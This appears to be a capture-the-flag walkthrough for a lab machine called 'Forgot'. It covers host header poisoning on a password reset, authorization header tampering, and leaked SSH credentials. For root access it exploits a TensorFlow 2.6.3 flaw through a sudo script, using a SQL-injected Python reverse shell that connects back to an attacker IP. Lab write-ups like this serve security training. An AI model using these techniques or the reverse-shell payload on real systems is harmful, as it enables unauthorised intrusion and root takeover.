**Forgot is an intermediate box which start with few basic web application misconfigurations. Box runs vulnerable tensorflow python package in a script which is run as sudo/root**

### Finding username in the source code
If we check th source then we'd find a user `robert-dev-14320`.

We cannot guess the password or brute-force it as caching and responses make the wait completely unbearable, but there is `forgot` password present so let's check that.

# Initial Foothold - digging deeper
## Host Header Poisoning on forgot password

It appears that we can poison host header which makes the webserver to issue an request (HTTP!) to our own server

We can set a new password for `robert-dev-14320` and access the Support Portal. Be patient and make sure you URL encode your token!

## Getting onto Admin Panel

We can find admin's dashboards if we check the site map.

If we however try to access it with `robert-dev-14320` we'd be redirected to denied page.

Good thing is that we can tamper the authorization header without having the right password as apparently only user will be checked.

## Finding Diego's credentials

If we check the response in Burp of the request above to `admin_tickets` we'd find diego's password.

Credentials work with SSH `diego:dCb#1!x0%gjq`.

# Privilege Escalation

We can run script as sudo

```
diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```

## Tensorflow Vulnerability

If we check the `/opt/security/ml_security.py` we'll find the tensorflow import.

```python
#!/usr/bin/python3
import sys
import csv
...
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
...
```

We can check `tensorflow`'s version:

```
diego@forgot:~$ pip3 show tensorflow | grep Version
Version: 2.6.3
```

This version of Tensorflows is vulnerable to Remote Code Execution.  References:

Script `/opt/security/ml_security.py` loads input from `escalate` table.

`reason` column in `escalate` table (`app` database) resides on 4th position. 

```
diego@forgot:~$ mysql -u diego -p'dCb#1!x0%gjq' -D app -e "show columns from escalate;"
mysql: [Warning] Using a password on the command line interface can be insecure.

```

The vulnerability is pretty trivial to exploit if we check the PoC: https://github.com/advisories/GHSA-75c9-jrh4-79mc

We just have to keep in mind that we need to inject our payload into reason column:

```sql
insert into escalate values ("user","issue","link",'hello=exec("""\nimport socket\nimport subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.10.14.52",5555))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")');
```

Run `sudo /opt/security/ml_security.py` and shell should pop as root. (For the payload above, listener has to be started beforehand on the attackers machine!)
